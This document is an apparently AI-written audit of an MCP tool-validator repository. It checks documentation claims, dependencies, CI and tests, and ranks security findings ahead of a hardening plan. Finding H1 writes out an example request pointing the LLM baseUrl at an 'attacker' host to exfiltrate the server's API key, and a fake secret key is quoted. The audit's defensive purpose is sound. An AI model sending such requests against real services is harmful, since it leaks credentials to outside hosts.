# Repository Audit — 2026-10-01

> **Status:** this is the Phase 1 snapshot of the repository *before* the
> hardening changes. Findings are addressed in version 0.2.0; see
> [CHANGELOG.md](CHANGELOG.md) and the pull request for the final status of
> each claim. Line numbers refer to the audited commit `25be713`.

Audited commit: `25be713` (default branch `master`). Branch: `hardening/2026-10-01`.
All commands were run on macOS against a fresh `git clone` of that commit unless noted.
Version and spec facts were fetched from official sources on 2026-10-01 (sources listed in §3).

Status legend: **Verified** (evidence given) · **Wrong** (contradicted by code, data, or a run) ·
**Unverifiable** (cannot be checked from the code, committed data, or a reproducible run).

---

## 1. What the project does (from the code)

`mcp-tool-validator` is a TypeScript library, CLI (`mcp-validate`) and small Hono HTTP service that
takes MCP tool definitions — from a JSON/YAML file or discovered live from an MCP server over stdio
or Streamable HTTP via `tools/list` — and normalizes them into a common shape.
It runs 57 static rules in five categories (schema, naming, security, LLM-compatibility, best
practice) against a selected MCP revision (`2026-07-28` default, or `2025-11-25`), tags every
finding with specification/governance/heuristic provenance, and computes a per-tool-averaged
0–100 maturity score plus separate `compliant` (spec) and `valid` (policy) verdicts.
Results are rendered as human text, JSON or SARIF 2.1.0, with an optional LLM pass (AI SDK:
Anthropic/OpenAI/Ollama) that adds per-tool clarity scores without discarding static findings.

---

## 2. Accuracy of claims

The core claims are accurate:

- **Rules:** 57 rules are registered, split SCH 11 / NAM 7 / SEC 11 / LLM 13 / BP 15.
- **2025-11-25 skips:** exactly three rules (SCH-009, SCH-010, SEC-011) are skipped for that revision.
- **Scoring:** deductions are −5/−2/−1 and level thresholds are 91/71/41.
- **Config discovery:** the documented order matches the code.
- **CLI:** every documented flag exists.
- **HTTP service:** behaves as documented.
- **SARIF:** output is version 2.1.0.
- **API:** the documented exports and result fields exist.
- **Test gate:** "71 files / 1,036 tests" is correct.

The serious problems are elsewhere: the install instructions, an unbacked case-study number, a large set of rule examples, and dates.

### 2.1 README.md

| # | Claim | Status | Evidence |
|---|---|---|---|
| R1 | `npm install mcp-tool-validator` | **Wrong — hazardous** | `npm view mcp-tool-validator` → v0.1.5, repo `github.com/squatguard/mcp-tool-validator`, different maintainer. The name belongs to an unrelated package, so the command installs third-party code. This project has never been published. |
| R2 | Bare `mcp-validate …` commands in Quick Start | **Wrong** | After a clone, `mcp-validate` is not on PATH. `npx mcp-validate` fetches an unrelated npm package `mcp-validate@1.0.0` (observed during this audit). |
| R3 | 57 rules / 5 categories / per-category counts | Verified | Registry dump of `src/rules/index.ts` |
| R4 | SCH-009, SCH-010 and SEC-011 are 2026-07-28 only | Verified | Only those three declare `specVersions`; filtered at `src/core/rule-loader.ts:34` |
| R5 | Maturity scoring: averaged per tool, −5/−2/−1, level table | Verified | `src/core/rule-engine.ts:114-143,188-191` |
| R6 | CLI options table, including `serve -p/-h` | Verified | `src/cli.ts:210-283`; `--help` output |
| R7 | `[file]` accepts a single tool, an array, `{tools}`, or a manifest | Verified | `src/parsers/file.ts:68-85` |
| R8 | Programmatic API names and result fields | Verified | `dist/index.d.ts`; `src/types/index.ts:112-187` |
| R9 | `GET /health`; `POST /validate` returns 400 on bad config; on/off normalized | Verified | Ran `serve` and curled both endpoints (`{"status":"healthy","version":"0.1.0"}`; `400 Invalid request configuration`) |
| R10 | 2026-07-28 live path: JSON-RPC checks, `ttlMs`/`cacheScope` on every page, structured errors, no `server/discover` | Verified | `src/parsers/mcp-client.ts:195-237,331-389`; ran against `tests/fixtures/modern-mcp-server.mjs` (85/100, compliant) |
| R11 | Spec Compliance against the "finalized MCP 2026-07-28 specification" | Wrong, minor | 2026-07-28 is the latest released revision, but the spec labels it **Current**, not Final (§3.2) |
| R12 | Config discovery order; strict unknown-key rejection | Verified, caveat | `src/core/config.ts:133-147,192`. Unknown **rule IDs** are accepted silently (`z.record(z.string(), …)`). |
| R13 | A failed LLM run is reported in `metadata.llmAnalysisError` and static results are kept | Verified | Ran `--llm` without the provider package installed: error recorded, score still returned |
| R14 | Default LLM model `claude-haiku-4-5` | Verified | `src/llm/analyzer.ts:114,261` |
| R15 | Google Drive run on 2026-08-05: 8 tools, compliance profile, 87/100 Mature | **Unverifiable** | No committed artifact. The case-study table it summarizes is internally inconsistent (C3). |
| R16 | `npm run analyze:servers` "connect[s] to the configured official MCP servers" | Wrong, partial | The script uses default 2026-07-28 discovery, which the legacy official servers fail ("ttlMs must be a non-negative integer"). It needs `discoverySpecVersion: '2025-11-25'`. |
| R17 | "Test gate 71 files / 1,036 tests" | Verified | `vitest run`: `Test Files 71 passed (71) / Tests 1036 passed (1036)` |
| R18 | License: MIT | Wrong, partial | `package.json` says MIT, but there is **no LICENSE file**. GitHub reports `licenseInfo: null`. |
| R19 | Relative documentation links (8) | Verified | All targets exist |

### 2.2 Repo description, package.json, site

| # | Source | Claim | Status | Evidence |
|---|---|---|---|---|
| D1 | GitHub description | "57 rules for LLM compatibility, security, and spec compliance, with CLI, HTTP service, and SARIF output for CI" | Verified | Registry; `cli.ts`, `server.ts`, `sarif.ts` |
| D2 | package.json `description` | "governance validator… quality, security, and LLM-compatibility" | Verified | Matches features |
| D3 | docs/index.html (Pages) | 57 rules, 3 formats, 1,036 tests | Verified | As R3/R17 |
| D4 | docs/index.html | Demo shows "8/8 valid… MATURE (87/100)" | **Unverifiable** | Same as R15 |
| D5 | docs/index.html | Quick Commands run `mcp-validate` straight after `npm install && npm run build` | **Wrong** | Binary not on PATH (R2) |
| D6 | docs/presentation.html | "99 polished / 60 needs-work" with issue counts | Verified | CLI runs on `examples/` |
| D7 | docs/presentation.html | "75 — official memory server validated live" | **Wrong** | `--spec-version 2025-11-25` gives 76. Default discovery fails. |
| D8 | docs/presentation.html | `npx -y @mcp/server-memory` | **Wrong** | That package returns 404. The real one is `@modelcontextprotocol/server-memory`, and it needs legacy discovery. |
| D9 | docs/presentation.html | "BadName!!" sample output | **Wrong** | Real NAM-002 wording differs. The sample shows ✗ but its summary says 1/1 valid. A real run gives about 13 findings, not 4. |
| D10 | docs/presentation.html | "Every issue carries… schema path and a concrete fix suggestion" | Wrong, partial | `path` and `suggestion` are optional, and BP-001 has neither |
| D11 | docs/presentation.html | "plugs into GitHub code scanning" | Unverifiable | Never uploaded in CI. SARIF output itself is Verified. |

### 2.3 `mcp-validate.config.yaml` (committed sample config)

| # | Claim | Status | Evidence |
|---|---|---|---|
| K1 | `SCH-001 # Require valid JSON Schema` | **Wrong** | SCH-001 is "Tool must have a name field"; schema validity is SCH-004 |
| K2 | `NAM-001 # Tool names should be kebab-case` | **Wrong** | No NAM-001 exists, and naming is casing-neutral. Stale "NAM-001" comments remain in `nam-003.ts:21`, `nam-004.ts:21`, `nam-005.ts:244`, and a kebab-case suggestion in `sch-001.ts:29`. |
| K3 | SEC-001, SEC-002, LLM-001 comments | Verified | Registry |

### 2.4 docs/RULES.md and docs/BEST_PRACTICES.md

These verified:

- **Rule behaviour:** about 50 of the 57 rule descriptions and examples. They were checked against the source and by running the doc examples through the CLI.
- **BEST_PRACTICES.md:** the scoring method, level table, rule ID ranges and thresholds (NAM-008 ≥10 tools, BP-005 ≤10 params, BP-007 ≤4 levels).

These are Wrong:

| # | Claim | Status | Evidence |
|---|---|---|---|
| U1 | LLM-001 "Severity: error" (RULES.md:105) | **Wrong** | `llm-001.ts:14` sets `defaultSeverity: 'warning'` |
| U2 | LLM-009 "good" example (range 1-100) passes | **Wrong** | The CLI flags it |
| U3 | LLM-011 "bad" example ("Removes a user…") is flagged | **Wrong** | No finding |
| U4 | LLM-012 "bad" example (user-create/update/delete) is flagged | **Wrong** | 0 findings; threshold not met |
| U5 | SCH-006 "Acceptable (documented)" example | **Wrong** | Still warns |
| U6 | SEC-007 flags "key" | **Wrong** | A bare `key` is not in the pattern list |
| U7 | BP-010 / BEST_PRACTICES: icon `src` may be "a `data:` URI" | **Wrong** | Only base64 `data:image/*` passes. The rule's own message says the same wrong thing. |
| U8 | BP-009 "Severity: suggestion" | Wrong, partial | Escalates to warning in some cases (`bp-009.ts`) |
| U9 | BP-014 "Anthropic measured ~3x"; BP-010 "clients only required to support png/jpeg" | Unverifiable | External claims with no citation |

### 2.5 docs/specs, docs/architecture, docs/test, examples, fixtures

| # | Claim | Status | Evidence |
|---|---|---|---|
| S1 | specs: error codes FILE_NOT_FOUND, PARSE_ERROR, INVALID_FORMAT, CONNECTION_FAILED, PROTOCOL_ERROR, TIMEOUT | **Wrong** | None exist in `src/` |
| S2 | specs: human-output sample; JSON sample "88 / mature" | **Wrong** | Real output adds provenance and maturity blocks. The sample's own counts would score about 96. |
| S3 | specs: ValidationMetadata fields; runtime dependency list | Wrong, partial | `llmAnalysisError` is missing. The list omits cosmiconfig, zod, hono, @hono/node-server and ajv-formats. |
| S4 | specs: exit codes 0/1/2; LIVE-001..006 implemented and tested | Verified | CLI runs; tests listed in the case study |
| A1 | architecture: CLI via `npx mcp-validate` | **Wrong** | Fetches the unrelated `mcp-validate` package (R2) |
| A2 | architecture: rule docs are "linked from issue output" | **Wrong** | Issue `documentation` URLs point to modelcontextprotocol.io and json-schema.org |
| A3 | architecture: Cosmiconfig loads "YAML/JSON/JS"; rule export sample | Wrong, partial | No JS search places. Rules use a `export default rule` pattern. |
| A4 | architecture: stack versions (Commander 14, Hono 4, Vitest 4, MCP SDK 1.30+, TS 5, Node 20+) | Verified (as installed) | Lockfile. These are now outdated (§3). |
| T1 | test-plan: 71 / 1,036; typecheck clean; tsup ESM and dts | Verified | Test run; `npm run typecheck` exits 0 |
| E1 | examples/README: needs-work file demonstrates "**naming**… issues" | **Wrong** | 0 naming findings; other categories as stated |
| E2 | examples/README: commands; polished file scores high | Verified | 99/100 Exemplary |
| F1 | tests/fixtures/README: fixture list, no tool execution, no `server/discover` | Verified | `ls`; grep |

### 2.6 Case study, reports, planning docs

| # | Claim | Status | Evidence |
|---|---|---|---|
| C1 | Drive endpoint and the eight public tool names | Verified | During this audit, a live `tools/list` returned exactly those 8 names. This is the only external server contacted, read-only, with no auth and no tool calls. |
| C2 | Initial run: 400 "Unsupported protocol version"; 0/8 valid; 20/32/22; 77/100 | **Unverifiable** | No artifact, and it no longer reproduces: default discovery works today |
| C3 | "Findings by rule" table, total 74 | **Wrong** | The rows sum to 66 |
| C4 | Follow-up: compliant, 8/8, 0/43/22, **87/100 Mature** | **Unverifiable** | No artifact. A re-run on 2026-10-01 gives compliant, 8/8, 0/48/17, **86/100 Mature**. The server's tool set or descriptions may have changed since. |
| P1 | `reports/*-2025-01-08.md` filenames and headers; "Calibration Fixes (2025-01-07)"; `validator-chunks.md` "Original plan: 2025-01-07" | **Wrong** | The repo's first commit is 2026-01-07, and those reports were committed 2026-01-08/09 (`git log -- reports/`). One report also cites MCP 2025-11-25, which postdates 2025-01-08. |
| P2 | Main report footer "v0.1.1" | **Wrong** | `package.json` has only ever been 0.1.0 (`git log -S`) |
| P3 | Main report "Issues by Category" table | **Wrong** | 5 of 6 rows disagree with the fixture JSON. The column total is 676, but the severity total is 671. |
| P4 | Main report summary (46 rules, 62 tools, scores 71–84); `summary.md` (35 tools, 93/49/143) | Verified (historical) | Matches `tests/fixtures/*.json` and `reports/*.json` |
| P5 | LLM report per-tool scores and prose | Unverifiable | No raw output committed. `scripts/llm-analyze.mjs:14` overwrites this file on re-run. |
| P6 | `initial_spec.md` | Verified | Labelled as a historical brief; links resolve |

### 2.7 Links, local paths, employer references

- **Relative links:** none broken (README, docs/*, reports, fixtures). External documentation links all return 200, two through redirects.
- **Broken URLs emitted by code:**
  - SARIF `$schema` (`src/reporters/sarif.ts:107`, `…/sarif-spec/master/Schemata/sarif-schema-2.1.0.json`) returns **404**; the current path `…/sarif-spec/main/sarif-2.1/schema/sarif-schema-2.1.0.json` returns 200.
  - The SCH-009 documentation anchor `#ref-resolution` was not found on the target page.
- **Absolute local paths in committed files:**
  - `.claude/agents/code-reviewer.md:12`
  - `reports/filesystem.json` (14 occurrences of an absolute `/Users/<name>/...` path)
  - Runtime: `metadata.configUsed` is an absolute path, and the HTTP service returns it to remote callers.
- **Employer references:** none found. Named companies are all public vendors or products used as examples or targets: Anthropic, OpenAI, Ollama, Vercel, Google Drive MCP, GitHub, Microsoft Playwright, Asana, Stripe, Linear. One possible sensitivity for you to judge, not a finding: commit `3bbc6ba` describes the site palette as "coffeehouse", and its primary colour `#1e3932` matches a well-known coffee chain's brand green. No names, logos or fonts are used.

---

## 3. Currency

### 3.1 Runtime and dependencies

Node.js status (source: `nodejs/Release` schedule.json, nodejs.org/dist):

- **Node 20:** EOL since 2026-04-30. CI runs Node 20 only, and `engines` says `>=20`, so CI tests an unsupported runtime.
- **Node 22:** Maintenance LTS until 2027-04-30.
- **Node 24:** Active LTS (v24.21.0), entering Maintenance on 2026-10-20; supported until 2028-04-30.
- **Node 26:** Current; becomes LTS on 2026-10-28.

**Recommendation:** pin `.nvmrc` to 24, set `engines` to `>=22`, and run CI on 22 and 24.

Dependencies (`npm outdated`, npm registry 2026-10-01):

| Package | Locked | Latest | Notes |
|---|---|---|---|
| @modelcontextprotocol/sdk | 1.30.0 | 1.31.0 | Minor; safe |
| hono / @hono/node-server | 4.13.0 / 2.0.8 | 4.13.12 / 2.1.3 | Patch/minor; fixes audit findings |
| ajv / yaml / zod | 8.17.1 / 2.8.2 / 4.3.5 | 8.20.0 / 2.9.1 / 4.6.5 | Minor; fixes audit findings |
| ai (AI SDK) | 6.0.19 | 6.0.300 in range; **7.0.127** latest | Patch upgrade is safe. v7 and providers @ai-sdk/* v4 are major; need a code review of `analyzer.ts`. |
| commander / cosmiconfig / chalk | 14 / 9 / 5 | **15 / 10 / 6** | Major; low-risk but need changelog review |
| vitest / @vitest/coverage-v8 | 4.1.10 | **5.0.3** | Major |
| typescript | 5.9.3 | **7.0.2** (native Go port) | **Hold.** TS 7.0 ships no compiler API, and tsup's dts build calls `ts.createProgram` etc., so the upgrade breaks `npm run build`. Safe target: **6.0.3**. |
| tsup | 8.5.1 | 8.5.1 | **Unmaintained**: its README says to use tsdown. Keep it for now; propose migration separately. |
| @types/node | 20.x | 26.6.4 | Should track the minimum supported runtime (22.x) |
| @anthropic-ai/sdk (dev, scripts only) | 0.71.2 | 0.131.0 | Pre-1.0; only `scripts/llm-analyze.mjs` uses it |
| @modelcontextprotocol/server-github (dev) | 2025.4.8 | **deprecated** | Not referenced anywhere. Brings the unfixable high-severity advisories. Remove. |
| @modelcontextprotocol/server-* (dev) | 2025.x | 2026.8.31 | Only reached via `npx -y` strings in a script, so the devDeps are unused |

### 3.2 MCP specification

Sources: modelcontextprotocol.io/specification (redirects to `/specification/2026-07-28`); `/specification/2026-07-28/changelog`; `schema/2026-07-28/schema.ts` (`LATEST_PROTOCOL_VERSION = "2026-07-28"`); GitHub release `2026-07-28` (not a prerelease).

- **2026-07-28 is the latest released revision. It is labelled "Current", not "Final".** Per the versioning page, Current revisions "may continue to receive backwards compatible changes". The project's wording "finalized" is therefore inaccurate. Only `draft` is newer, and its changelog has no entries yet.
- **Implemented requirements match the official 2026-07-28 text:**
  - `ttlMs`/`cacheScope` are required on `tools/list` results (SEP-2549).
  - `HeaderMismatch` is code −32020 and `UnsupportedProtocolVersion` is −32022.
  - Per-request `_meta` replaces initialize.
  - `x-mcp-header` constraints apply (non-empty, `tchar`, no `number` type, case-insensitive uniqueness).
  - The JSON Schema default is 2020-12, with `type: "object"` required at the `inputSchema` root.
  - The tool-name grammar is 1–128 characters of `[A-Za-z0-9_.-]` (SHOULD).
- **Known gap (documented, not a bug):** the spec says servers **MUST** implement `server/discover`. The validator deliberately does not call it; it discovers via `tools/list` only. That is fine for a client-side validator, but it should be listed under Limitations.

---

## 4. Design

**What's good:**
- Clean rule-per-file layout with a typed `Rule` interface.
- A shared `schema-walker` with depth bounds.
- Pure reporters (result in, string out).
- One config schema (zod) reused for files and HTTP.
- Explicit provenance model.
- Strong per-rule tests.

**Findings, in severity order:**

1. **CLI entry is broken when installed.**
   - `src/cli.ts:290-296` decides whether to run by matching `process.argv[1]` against path suffixes. Through `node_modules/.bin/mcp-validate` (npm/npx installs), `--version` printed nothing and exited 0 (reproduced).
   - Windows paths also fail the check.
   - Fix: export a `run()` from `cli.ts` and call it from `bin/mcp-validate.js`.
2. **Core reads the filesystem implicitly.**
   - `validate()` always runs a cosmiconfig search of `process.cwd()` (`src/core/validator.ts:80`), and this cannot be injected or disabled. Library and HTTP callers silently pick up whatever config is in the working directory.
   - Config is loaded up to three times per CLI run (`cli.ts:141` → `validator.ts:214` → `:80`).
3. **Legacy discovery ignores pagination.**
   - `getToolDefinitions` calls `listTools()` once and drops `nextCursor` (`mcp-client.ts:584`), so paginated legacy servers are silently truncated.
   - The 30 s timeout only covers `connect` (`:550-568`).
4. **Configuration hard-coded in several places:**
   - The 30 000 ms timeout appears 3× and has no CLI flag.
   - The default spec version `'2026-07-28'` appears 3× (`validator.ts:26`, `config.ts:34`, `rule-loader.ts:15`).
   - The spec-version enum is repeated in `cli.ts` and `config.ts`.
   - Client version `'0.1.0'` is hard-coded in `mcp-client.ts:124,540` instead of `VERSION`.
   - Model names appear in `analyzer.ts:113-117,261` and in the script.
   - Port and host defaults appear twice.
5. **Duplication:**
   - `DEFAULT_RULES` (`config.ts:40-107`) hand-copies the rule registry.
   - The spec and heuristic rule ID sets live in `rule-engine.ts:20-28` instead of on each rule.
   - BP-007 has its own depth walker. Its composition branch does not increment depth (`bp-007.ts:59`), so deeply nested `anyOf` can overflow the stack. The engine catches it as an error finding.
   - `scripts/llm-analyze.mjs` re-implements the analyzer prompt and parser.
   - The modern pagination/cacheScope logic is duplicated in `mcp-client.ts`.
6. **Error handling is inconsistent:**
   - `process.exit` is called in 4 places in `cli.ts`.
   - `serve` bind errors (EADDRINUSE) are uncaught, and "listening" is logged before the bind.
   - Bad JSON on `POST /validate` returns 500, not 400, and a test locks this in.
   - One tool's LLM failure discards LLM results for all tools.
   - A crashing rule becomes an `error` finding, which flips `valid` to false.
7. **Logging:** there is no structured logging, only `console.*` and Hono's request logger.
   - Child-process stderr and remote HTTP error bodies are copied verbatim into thrown errors and printed (`mcp-client.ts:364,373,456,483`), so a server that logs a secret to stderr leaks it into CI logs.
   - No API key is ever written to results.
8. **`--quiet` filters human output by matching literal strings** (`cli.ts:179-199`), so it breaks if reporter wording changes.
9. **Dead code:**
   - `getAllRuleIds`, `isRuleRegistered`, `getRuleById`, `loadRuleModule` (`rules/index.ts:46-70`).
   - `hasToken` (`rules/utils/text.ts:29`).
   - Per-rule named exports (`SCH_001`, …).
   - Unused devDependency `@modelcontextprotocol/server-github`.
   - `.claude/commands/*` that assume the removed beads workflow (auto, breakdown, chunks-beads, impl, plan-to-beads, retro).

---

## 5. Tests

- **What exists:** 71 files and 1,036 tests.
  - Unit tests for every rule (one file per rule), the engine, config, parsers, reporters, analyzer (AI SDK mocked) and server (Hono `app.request`, no network).
  - Subprocess CLI tests.
  - One integration file (fixtures end-to-end).
  - One real stdio fixture server.
- **Clean clone:** `npm ci && npm test` passes: **71/71 files, 1036/1036 tests**.
  - Inside a restrictive sandbox that blocks localhost sockets, one test fails with `connect EPERM 127.0.0.1`. This is environmental, not a code defect.
  - `tests/unit/core/validator.test.ts:372` makes a real outbound network call that is expected to fail.
- **Coverage** (`vitest run --coverage`, v8): statements **92.4%**, branches **85.6%**, functions 92.6%, lines 92.8%.
  - Rules average about 96–99%; `core/` 98%.
  - `cli.ts` shows **34%** only because CLI tests run in a subprocess.
  - `service/server.ts` 83% (branches 48%), `parsers/mcp-client.ts` 82%, `rules/index.ts` 58% (dead code).
  - No coverage thresholds are enforced, and CI does not run coverage.
- **Most important untested paths:**
  1. The installed-bin entry point; the bug in §4 #1 would have been caught.
  2. CLI `--server`, `--llm`, `--quiet`, `--config`, `--profile`, `--discovery-spec-version`, and serve bind failure.
  3. HTTP service negative cases:
     - `llm` section in request config (see §7, H1)
     - oversized body
     - `null` tool elements (currently 500)
     - malformed JSON
     - cross-origin requests
  4. MCP client: connect and transport timeouts, stdio early exit and spawn errors, non-OK HTTP branches, endless pagination, redirects, legacy pagination.
  5. LLM: API key and `baseUrl` propagation, and that keys never appear in output or errors.
- **Security-relevant positive and negative pairs:**
  - Present: sensitive-data rules (SEC-007, SEC-008, SEC-011) and HTTP config validation (on/off normalization accepted, invalid severity rejected).
  - Missing: API key handling, request size limits, LLM config over HTTP. The current CORS test asserts allow-all.

---

## 6. CI/CD

`.github/workflows/ci.yml` runs one job on ubuntu with Node 20: `npm ci` → typecheck → build → test → `validate:examples`. It triggers on push and pull_request to main/master. GitHub Pages is a **legacy branch build** from `master:/docs` (`gh api …/pages`: `build_type: legacy`). There is no workflow for it, so Jekyll processes `docs/` as-is.

Gaps:
- No top-level `permissions:`, so the default token scope applies.
- Actions are pinned by mutable tag (`@v4`), not SHA. Latest versions are checkout v7.0.1 and setup-node v7.0.0.
- No `concurrency`, no `timeout-minutes`.
- Only Node 20, which is EOL.
- No lint or format check; no linter or formatter is configured at all.
- No coverage run; no link check; no dependency audit or dependency-review.
- No CodeQL; no Dependabot config.
- The build runs twice (`pretest` rebuilds).
- No status badge.

---

## 7. Security

### 7.1 Application (ranked)

| ID | Severity | Finding | Evidence |
|---|---|---|---|
| H1 | **High** | **The HTTP service lets any caller redirect the LLM call, and with it the server's API key.** `POST /validate` accepts `config.llm` (the file config schema is reused), and it replaces the server's own LLM settings. A request with `{"llm":{"enabled":true,"provider":"anthropic","baseUrl":"http://attacker"}}` makes the AI SDK provider read `ANTHROPIC_API_KEY`/`OPENAI_API_KEY` from the server's environment and send it to an arbitrary host. The same path is SSRF and cost amplification. | `server.ts:64-66`, `config.ts:176-198,311`, `analyzer.ts:92-96`. I confirmed the request schema accepts `llm`; exfiltration itself was not exercised. |
| H2 | **High** | **CORS allows any origin**, and there is no auth and no Host check. Any web page in the user's browser can POST to `http://localhost:8080/validate` (and reach H1). DNS rebinding is also possible. | `server.ts:39` `cors()` with defaults |
| M1 | Medium | **No body-size or tool-count limits** on `/validate`. The schema walker skips `patternProperties`, `dependentSchemas` and `$defs`, so those reach Ajv `compile` uncounted. | `server.ts:51-91`, `schema-walker.ts` |
| M2 | Medium | **Live HTTP discovery has no limits:** no response size cap, unlimited pagination (a server can loop forever on fresh cursors), and redirects are followed with the POST re-sent cross-host. | `mcp-client.ts:327-389` |
| M3 | Medium | **`--server "<cmd>"` executes an arbitrary local command** with the full parent environment (including API keys) on the 2026-07-28 path. The legacy path uses the SDK's filtered env. The README does not warn that it runs code. | `mcp-client.ts:402-405` vs `:531` |
| M4 | Medium | **Internals leak:** the 500 response echoes `error.message`; config errors include the server's config path; `configUsed` gives remote callers an absolute path; child stderr is copied into errors (§4 #7). | `server.ts:96`, `config.ts:233`, `validator.ts:140` |
| M5 | Medium | **Terminal escape injection:** untrusted tool names, descriptions and LLM text are printed without stripping control characters. | `human.ts:68,77,96` |
| L1 | Low | **LLM prompt injection:** tool text is interpolated verbatim with no delimiting, and the parser takes the greedy outermost braces. Output is only advisory. | `analyzer.ts:43-62,141` |
| L2 | Low | **Unknown rule IDs** in config are accepted silently. | `config.ts:193` |
| — | OK | YAML parsing uses `yaml` defaults: core schema, no JS tags, alias limit. The bind default is `localhost`. There is no `tools/call` path. API keys are never written to reports. | `file.ts:34`, `server.ts:124` |

### 7.2 Secrets

- **gitleaks (full history, 43 commits):** one hit, a deliberate fake key (`'sk-1234567890abcdef'`) in `.claude/skills/code-review/examples/anti-patterns.md:192`. False positive; should be allow-listed.
- `.env` (holds an `ANTHROPIC_API_KEY`) exists locally, is gitignored, and has **never been committed**.
- `.gitignore` does not cover `.env.*` generally (only `.env.local` and `.env.*.local`), `.claude/settings.local.json`, or `*.sarif`.

### 7.3 Dependency audit (`npm audit`, lockfile at 25be713)

- **All dependencies:** 26 advisories, of which 12 high, 9 moderate, 5 low, 0 critical.
- **Production only (`--omit=dev`):** 13 advisories, of which 3 high, 6 moderate, 4 low.
- **Production highs:**
  - `fast-uri`, via ajv.
  - `js-yaml`, via cosmiconfig: quadratic merge-key DoS.
  - `path-to-regexp`, via the MCP SDK's express: ReDoS.
- All production advisories have non-breaking fixes (`npm audit fix`).
- Dev highs include advisories with **no fix**, through the **deprecated** `@modelcontextprotocol/server-github`, which is unused and should be removed. The rest (rollup, postcss, nanoid, minimatch, form-data) are fixed by in-range updates and the vitest upgrade.

### 7.4 Workflow privilege

`ci.yml` has no `permissions:` block (default `GITHUB_TOKEN` scope) and uses unpinned tags. It has no `pull_request_target` and no secrets.

---

## 8. Onboarding (README followed literally, fresh clone)

| Step | Result |
|---|---|
| `npm install mcp-tool-validator` (README "Installation") | **Fails dangerously.** Installs an unrelated third-party package. |
| `mcp-validate tools.json` | **Fails.** Not on PATH. With `npx`, an unrelated `mcp-validate@1.0.0` is fetched and run. There is no `tools.json` in the repo; the README never points to `examples/`. |
| Development: `npm install` / `npm ci` | Works. Warns about 41 vulnerabilities (26 by `npm audit` after dedupe). |
| `npm test` | Works: 71/71 files, 1,036 tests. Builds first. |
| `npm run typecheck`, `npm run build` | Works |
| `node bin/mcp-validate.js examples/polished-tools.json` | Works: 99/100 Exemplary. Not documented in the README; only `examples/README.md` shows `node ./dist/cli.js`. |
| `mcp-validate serve --port 8080` (as `node bin/…`) | Works; `/health` returns 200 |
| `--server "node ./my-server.js"` | Works against `tests/fixtures/modern-mcp-server.mjs`. Undocumented that it executes the command. |
| `npm run analyze:servers` | Unclear and partially failing: it downloads servers with `npx -y`, and legacy servers fail default discovery (R16) |
| Node version | Not stated anywhere except `engines >=20` (EOL). No `.nvmrc`. |
| LICENSE, CONTRIBUTING, SECURITY, CHANGELOG | Missing |

---

## Prioritized plan for Phase 2

**P0: correctness, safety, honesty**

1. **Install and quickstart.**
   - Replace `npm install mcp-tool-validator` with a from-source quickstart (clone → `npm ci` → `npm run build` → `node bin/mcp-validate.js examples/polished-tools.json`, or `npm link`).
   - State plainly that the package is not published on npm, and that the npm name `mcp-tool-validator` belongs to an unrelated project.
   - Fix `npx mcp-validate` in architecture.md and the site.
   - **Your decision:** whether to rename the package later. I will not publish anything.
2. **Fix the bin entry** (`run()` export), with a test that executes through a `.bin`-style symlink.
3. **Harden the HTTP service:**
   - Reject `llm` (and any server-side-only keys) in request config.
   - Remove allow-all CORS (no CORS by default).
   - Add a `bodyLimit` and a max tool count.
   - Return 400 for malformed JSON and invalid tool elements.
   - Stop returning `configUsed`, and stop echoing internal error messages.
   - Add positive and negative tests for each.
4. **Fix dependency advisories:** in-range updates, remove the deprecated `server-github` and the other unused `server-*` devDeps, and target zero high or critical findings.
5. **Docs accuracy:**
   - Fix every **Wrong** item in §2: RULES examples and severities, config comments, specs, architecture, presentation, site commands, examples README, case-study arithmetic, report dates, "finalized" → "current".
   - Reword **Unverifiable** numbers. The Drive 87/100 becomes "reported on 2026-08-05 (no artifact retained); a re-run on 2026-10-01 scored 86/100". Optionally commit the 2026-10-01 JSON output as the artifact; this needs your OK because it records a third-party server's tool list.
6. **Add a LICENSE (MIT)** with your name. Fix the SARIF `$schema` URL.

**P1: currency and CI**

7. **Runtime:** `.nvmrc` = 24; `engines >=22`; `@types/node` 22. CI matrix on Node 22 and 24.
8. **Dependency upgrades:**
   - Minor/patch everywhere.
   - Majors where tests stay green: commander 15, cosmiconfig 10, chalk 6, vitest 5.
   - TypeScript to 6.0.3, holding back 7.x because of tsup's dts build.
   - Hold `ai` v7 and providers v4 unless the analyzer code needs only trivial changes; document either way.
9. **CI rewrite:**
   - `permissions: contents: read`, SHA-pinned actions, concurrency, timeouts.
   - Lint, format check, typecheck, coverage with thresholds, build, and a link check (lychee).
   - CodeQL workflow; Dependabot (npm and actions).
   - Badge in the README.
   - Pages stays a legacy build; I'll note that a workflow-based deploy is optional.
10. **Add lint and format tooling:** ESLint and typescript-eslint flat config plus Prettier, or Biome. One commit for formatting only, kept separate from logic changes.

**P2: design cleanup (no redesign)**

11. Allow `validate()` callers to pass config explicitly and skip filesystem discovery. The HTTP service will use this.
12. Centralize constants: default spec version, supported versions, timeouts, client version, model defaults. Add a `--timeout` flag.
13. Legacy pagination plus an overall timeout; HTTP discovery response size, page cap and `redirect: 'error'`; filtered env for modern stdio.
14. Strip control characters in the human reporter. Consistent error types instead of scattered `process.exit`. Minimal structured logging for `serve` (JSON lines; no bodies or headers).
15. Remove dead code; derive `DEFAULT_RULES` and provenance from the registry; fix BP-007 depth.
16. Remove the absolute paths: regenerate or sanitize `reports/filesystem.json`, and make `.claude/agents/code-reviewer.md` relative.

**P3: hygiene**

17. SECURITY.md, CONTRIBUTING.md, CHANGELOG.md (0.2.0), `.editorconfig`, issue and PR templates.
18. `.gitignore`: `.env*` except `.env.example`, `.claude/settings.local.json`, `*.sarif`. Add a `.gitleaks.toml` allow-listing the fake example key.
19. `.claude/commands/*` that reference the removed beads workflow: propose removal, but leave them unless you say so (they're your authored tooling).

**Recommendations only (not done by me):**
- Rename the default branch `master` → `main`.
- Repo settings via `gh`, listed in the PR.
- Migrate tsup → tsdown.
- AI SDK v7.
- A larger refactor to inject IO (config loader, transport) into `core/validator.ts`.
